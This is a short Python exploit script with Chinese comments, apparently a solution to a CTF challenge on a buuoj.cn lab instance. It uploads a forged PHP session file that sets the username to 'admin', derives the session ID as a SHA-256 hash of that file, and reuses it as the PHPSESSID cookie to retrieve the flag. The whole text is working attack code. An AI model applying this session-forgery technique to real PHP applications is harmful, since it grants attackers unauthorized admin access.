# -*- coding: utf-8 -*-
import requests
import hashlib
url='http://099c5ab8-da02-4345-b4fd-2844408899f8.node4.buuoj.cn:81/'
#上传伪造的session文件
files={"up_file":("sess",b'\x08usernames:5:"admin";')}
data={
    'direction':'upload',
    'attr':''
}
req=requests.post(url,data=data,files=files)

#获取session_id
session_id=hashlib.sha256(b'\x08usernames:5:"admin";').hexdigest()

#在/var/babyctf/下创建success.txt目录
data1={
    'attr':'success.txt',
    'direction':'upload'
}
req1=requests.post(url=url,data=data1,files=files)

#通过伪造的session文件解析，获取flag
cookie={
    'PHPSESSID':session_id
}

flag=requests.get(url,cookies=cookie)
print(flag.text)